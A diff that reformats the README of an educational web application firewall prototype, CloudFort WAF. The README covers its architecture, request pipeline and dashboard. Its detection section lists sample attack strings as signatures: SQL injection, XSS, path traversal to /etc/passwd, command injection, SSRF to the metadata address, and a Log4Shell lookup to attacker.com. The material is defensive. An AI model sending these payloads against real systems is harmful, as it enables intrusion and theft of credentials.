@@ -1,167 +1,170 @@
-CloudFort WAF
+🛡️ CloudFort WAF
 
-CloudFort WAF is a cloud-based Web Application Firewall (WAF) prototype designed to protect web applications against common application-layer attacks through reverse proxy protection, request inspection, attack detection, rate limiting, IP blacklisting, structured logging, and real-time monitoring.
+<div align="center">
 
-The project demonstrates how a modern Web Application Firewall can inspect HTTP requests before they reach a protected application, identify malicious payloads, block threats, and provide visibility through an administrative dashboard.
+Cloud-Based Web Application Firewall
 
-⸻
+A cloud-native Web Application Firewall (WAF) prototype designed to protect web applications from common application-layer attacks through reverse proxy protection, threat detection, attack logging, IP blacklisting, rate limiting, and real-time monitoring.
 
-Features
-
-Security Features
-
-* Reverse Proxy Protection
-* HTTP Request Inspection
-* Payload Normalization
-* SQL Injection Detection
-* Cross-Site Scripting (XSS) Detection
-* Path Traversal Detection
-* Command Injection Detection
-* Server-Side Request Forgery (SSRF) Detection
-* XML External Entity (XXE) Detection
-* Log4Shell-style Payload Detection
-* Suspicious User-Agent Detection
-* Severity-Based Blocking Decisions
-* Rate Limiting
-* Manual IP Blacklisting
-* Automatic IP Blacklisting
-* Structured Attack Logging
-* Security Header Injection
-
-Monitoring Features
-
-* Attack Statistics Dashboard
-* Real-Time Attack Visibility
-* Top Attackers Monitoring
-* Hourly Attack Activity Tracking
-* Detailed Attack Logs
-* Blacklist Management
+</div>
 
 ⸻
 
-Project Architecture
+🚀 Live Demo
 
-The system consists of three major components:
+Protected Application
 
-1. CloudFort WAF Backend
+🔗 https://cloudfort-waf-demo-production.up.railway.app/
 
-Built using FastAPI and acts as a reverse proxy security gateway.
+Security Dashboard
 
-Responsibilities:
-
-* Receive all incoming HTTP requests
-* Extract client IP addresses
-* Check blacklist status
-* Apply rate limiting
-* Normalize request payloads
-* Run attack detection rules
-* Calculate severity scores
-* Block malicious requests
-* Forward clean requests
-* Store security events
-* Provide dashboard APIs
-* Inject security headers
+🔗 https://cloudfort-waf-demo-production.up.railway.app/dashboard/
 
 ⸻
 
-2. NexaStore Protected Application
+📖 Overview
 
-NexaStore is a demo e-commerce application that represents the protected target.
+CloudFort WAF is a reverse-proxy security gateway that protects web applications from common web-based attacks before they reach the backend application.
 
-The application never receives direct traffic from users. All requests must pass through CloudFort WAF first.
+Instead of allowing users to communicate directly with the application server, CloudFort sits in front of the application, inspects every HTTP request, detects malicious payloads, blocks threats, logs security events, and forwards only legitimate traffic.
 
-⸻
+The project demonstrates modern cybersecurity concepts including:
 
-3. React Monitoring Dashboard
-
-The dashboard provides administrators with visibility into security events.
-
-Dashboard capabilities include:
-
-* Total detected attacks
-* Unique attacker count
-* Attack category distribution
-* Top attacker IP addresses
-* Blacklisted IP management
-* Detailed attack logs
-* Activity trends
+* Reverse Proxy Architecture
+* Web Application Firewalls
+* Application-Layer Security
+* Attack Detection
+* Security Monitoring
+* Cloud Deployment
+* Containerization
+* DevSecOps Practices
 
 ⸻
 
-Request Processing Pipeline
+🎯 Project Goals
 
-Every incoming request passes through the following stages:
+The primary objectives of CloudFort WAF are:
 
-Step 1 – Client IP Identification
+* Protect web applications from common attacks
+* Inspect application-layer HTTP traffic
+* Detect malicious payloads
+* Block suspicious requests
+* Implement rate limiting
+* Support IP blacklisting
+* Store attack logs
+* Visualize security events
+* Demonstrate cloud-native security architecture
+* Provide an educational WAF implementation
 
-CloudFort extracts the source IP address from the request.
+⸻
 
-This IP is used for:
+🏗️ System Architecture
+
+                    ┌─────────────┐
+                    │   Client    │
+                    └──────┬──────┘
+                           │
+                           ▼
+          ┌────────────────────────────────┐
+          │         CloudFort WAF          │
+          │                                │
+          │  • IP Identification           │
+          │  • Blacklist Validation        │
+          │  • Rate Limiting               │
+          │  • Payload Normalization       │
+          │  • Attack Detection Engine     │
+          │  • Severity Scoring            │
+          │  • Request Blocking            │
+          │  • Attack Logging              │
+          │  • Security Headers            │
+          └──────────────┬─────────────────┘
+                         │
+                         ▼
+          ┌────────────────────────────────┐
+          │           NexaStore            │
+          │     Protected Application      │
+          └────────────────────────────────┘
+                         │
+                         ▼
+                    Response
+
+⸻
+
+⚙️ How It Works
+
+Every incoming request follows the following lifecycle:
+
+1️⃣ Client IP Identification
+
+CloudFort extracts the source IP address.
+
+The IP is used for:
 
 * Rate limiting
-* Blacklist validation
-* Logging
+* Blacklist checking
+* Attack attribution
+* Security logging
 
 ⸻
 
-Step 2 – Request ID Generation
+2️⃣ Request ID Generation
 
-A unique request identifier is generated for every request.
+Each request receives a unique identifier.
 
 Example:
 
-REQ-2026-001
+REQ-2026-0001
 
-This simplifies attack tracking and investigation.
+This makes incident tracking easier.
 
 ⸻
 
-Step 3 – Blacklist Validation
+3️⃣ Blacklist Validation
 
-The WAF checks whether the source IP exists in the blacklist.
+Before any inspection occurs, the WAF checks whether the IP address is blacklisted.
 
-If the IP is blacklisted:
+If found:
 
 403 Forbidden
 
-is returned immediately.
+The request is immediately rejected.
 
 ⸻
 
-Step 4 – Rate Limiting
+4️⃣ Rate Limiting
 
-CloudFort tracks request volume from every IP.
+CloudFort tracks request volume per IP.
 
-If a client exceeds the configured threshold:
+If an IP exceeds the configured threshold:
 
 429 Too Many Requests
 
 is returned.
 
-This helps mitigate:
+This helps prevent:
 
 * Brute-force attacks
-* Automated scanning
+* Automated scanners
 * Abuse attempts
 * Excessive traffic
 
 ⸻
 
-Step 5 – Payload Extraction
+5️⃣ Payload Extraction
 
 The WAF extracts request data from:
 
 * URL paths
 * Query parameters
 * Request bodies
-* Headers
+* HTTP headers
 * User-Agent strings
 
 ⸻
 
-Step 6 – Payload Normalization
+6️⃣ Payload Normalization
 
-Before inspection, request data is normalized.
+Incoming payloads are normalized before inspection.
 
 Normalization includes:
 
@@ -178,21 +181,23 @@ becomes:
 
 <script>alert(1)</script>
 
-This reduces simple encoding-based bypass attempts.
+This reduces encoding-based evasion attempts.
 
 ⸻
 
-Step 7 – Detection Engine
+7️⃣ Detection Engine
 
-The detection engine evaluates the normalized payload against predefined attack signatures.
+The normalized payload is evaluated against attack signatures.
 
-SQL Injection
+SQL Injection Detection
 
 Examples:
 
 ' OR 1=1 --
 UNION SELECT
 DROP TABLE
+
+⸻
 
 Cross-Site Scripting (XSS)
 
@@ -201,11 +206,16 @@ Examples:
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 
+⸻
+
 Path Traversal
 
 Examples:
 
 ../../etc/passwd
+..\..\windows\system32
+
+⸻
 
 Command Injection
 
@@ -214,12 +224,16 @@ Examples:
 ; whoami
 && cat /etc/passwd
 
+⸻
+
 SSRF
 
 Examples:
 
 http://127.0.0.1
 http://169.254.169.254
+
+⸻
 
 XXE
 
@@ -228,11 +242,15 @@ Examples:
 <!DOCTYPE foo>
 <!ENTITY xxe SYSTEM>
 
+⸻
+
 Log4Shell-style Payloads
 
 Examples:
 
 ${jndi:ldap://attacker.com/a}
+
+⸻
 
 Suspicious User Agents
 
@@ -244,11 +262,9 @@ acunetix
 
 ⸻
 
-Step 8 – Severity Scoring
+🎯 Severity Scoring
 
-Each matched rule contributes to a severity score.
-
-Example:
+Each detection rule contributes to a severity score.
 
 Attack Type	Severity
 XSS	Medium
@@ -257,30 +273,34 @@ Path Traversal	High
 SSRF	High
 Command Injection	Critical
 
-The cumulative score determines whether a request should be blocked.
+The final score determines whether a request should be blocked.
 
 ⸻
 
-Step 9 – Blocking Decision
+🚫 Blocking Logic
 
 If the severity score exceeds the configured threshold:
 
 403 Forbidden
 
-is returned.
+The attack is blocked before reaching the protected application.
 
-The request is blocked before reaching the protected application.
+Otherwise:
+
+Request Allowed
+
+and the request is forwarded.
 
 ⸻
 
-Step 10 – Clean Request Forwarding
+🔄 Clean Request Forwarding
 
 Legitimate requests are forwarded to NexaStore while preserving:
 
-* HTTP method
-* Request body
-* Query parameters
-* Required headers
+* HTTP Method
+* Request Body
+* Query Parameters
+* Required Headers
 
 Flow:
 
@@ -294,26 +314,63 @@ Response
 
 ⸻
 
-Step 11 – Security Header Injection
+🔒 Security Headers
 
-Before returning the response, CloudFort injects security headers such as:
+CloudFort injects security headers into outgoing responses.
+
+Examples:
 
 X-Frame-Options: DENY
 X-Content-Type-Options: nosniff
 Content-Security-Policy: default-src 'self'
 
-These headers strengthen browser-side security.
+These headers strengthen browser-side protection.
 
 ⸻
 
-Attack Logging
+📊 Dashboard Features
+
+The React Dashboard provides real-time visibility into security events.
+
+Attack Overview
+
+* Total Attacks
+* Unique Attackers
+* Blocked Requests
+
+Threat Analytics
+
+* Attack Categories
+* Attack Distribution
+* Hourly Activity
+
+Attacker Visibility
+
+* Top Attackers
+* Source IP Monitoring
+
+Blacklist Management
+
+* View Blocked IPs
+* Add IPs
+* Remove IPs
+
+Attack Logs
+
+* Detailed Event Records
+* Severity Levels
+* Payload Information
+
+⸻
+
+📝 Attack Logging
 
 Every detected attack is stored in SQLite.
 
-Each log record includes:
+Stored fields include:
 
 * Request ID
-* Source IP Address
+* Source IP
 * HTTP Method
 * Request Path
 * Attack Type
@@ -334,43 +391,37 @@ Action	Blocked
 
 ⸻
 
-Dashboard API Endpoints
+🔥 Security Features
 
-Get Attack Logs
-
-GET /waf/attacks
-
-Get Statistics
-
-GET /waf/stats
-
-Get Top Attackers
-
-GET /waf/top-attackers
-
-Get Blacklisted IPs
-
-GET /waf/blacklist
-
-Add IP to Blacklist
-
-POST /waf/blacklist/{ip}
-
-Remove IP from Blacklist
-
-DELETE /waf/blacklist/{ip}
+Feature	Status
+Reverse Proxy Protection	✅
+SQL Injection Detection	✅
+XSS Detection	✅
+Path Traversal Detection	✅
+Command Injection Detection	✅
+SSRF Detection	✅
+XXE Detection	✅
+Log4Shell Detection	✅
+Payload Normalization	✅
+Rate Limiting	✅
+IP Blacklisting	✅
+Structured Logging	✅
+Dashboard Monitoring	✅
+Security Headers	✅
+Docker Deployment	✅
+Cloud Deployment	✅
 
 ⸻
 
-Technology Stack
+🛠️ Technology Stack
 
 Backend
 
 * Python
 * FastAPI
-* Uvicorn
 * HTTPX
 * SQLite
+* Uvicorn
 
 Frontend
 
@@ -392,7 +443,7 @@ Deployment
 
 ⸻
 
-Repository Structure
+📁 Repository Structure
 
 cloudfort-waf-demo/
 │
@@ -421,14 +472,14 @@ cloudfort-waf-demo/
 
 ⸻
 
-Local Installation
+🚀 Local Installation
 
 Clone Repository
 
 git clone https://github.com/Mazen2004212/cloudfort-waf-demo.git
 cd cloudfort-waf-demo
 
-Run Demo Application
+Run NexaStore
 
 cd demo-site
 npm install
@@ -448,7 +499,7 @@ npm run dev
 
 ⸻
 
-Docker Deployment
+🐳 Docker Deployment
 
 Build image:
 
@@ -458,7 +509,7 @@ Run container:
 
 docker run -p 8000:8000 cloudfort-waf
 
-Open:
+Application:
 
 http://localhost:8000
 
@@ -468,24 +519,37 @@ http://localhost:8000/dashboard
 
 ⸻
 
-Future Improvements
+🔮 Future Enhancements
 
-* Dashboard Authentication
+* Authentication System
 * Role-Based Access Control (RBAC)
 * PostgreSQL Integration
-* Redis-Based Rate Limiting
+* Redis Rate Limiting
 * SIEM Integration
-* Email Alerting
+* Email Alerts
 * GeoIP Filtering
-* Advanced Rule Sets
+* OWASP CRS Compatibility
 * Kubernetes Deployment
 * CI/CD Integration
-* Machine Learning-Based Detection
+* Machine Learning Detection
+* Threat Intelligence Feeds
 
 ⸻
 
-Disclaimer
+⚠️ Disclaimer
 
-CloudFort WAF is an educational and demonstration-oriented security project. It is designed to showcase Web Application Firewall concepts, reverse proxy architecture, application-layer request inspection, attack detection, logging, monitoring, and cloud deployment.
+CloudFort WAF is an educational and demonstration-oriented Web Application Firewall prototype designed to showcase reverse proxy architecture, application-layer attack detection, logging, monitoring, and cloud deployment.
 
-It is not intended to replace enterprise-grade WAF products in production environments.
+It is not intended to replace enterprise-grade WAF solutions in production environments.
+
+⸻
+
+<div align="center">
+
+🛡️ CloudFort WAF
+
+Protect • Detect • Monitor
+
+Built with ❤️ using FastAPI, React, Docker, and Railway
+
+</div>
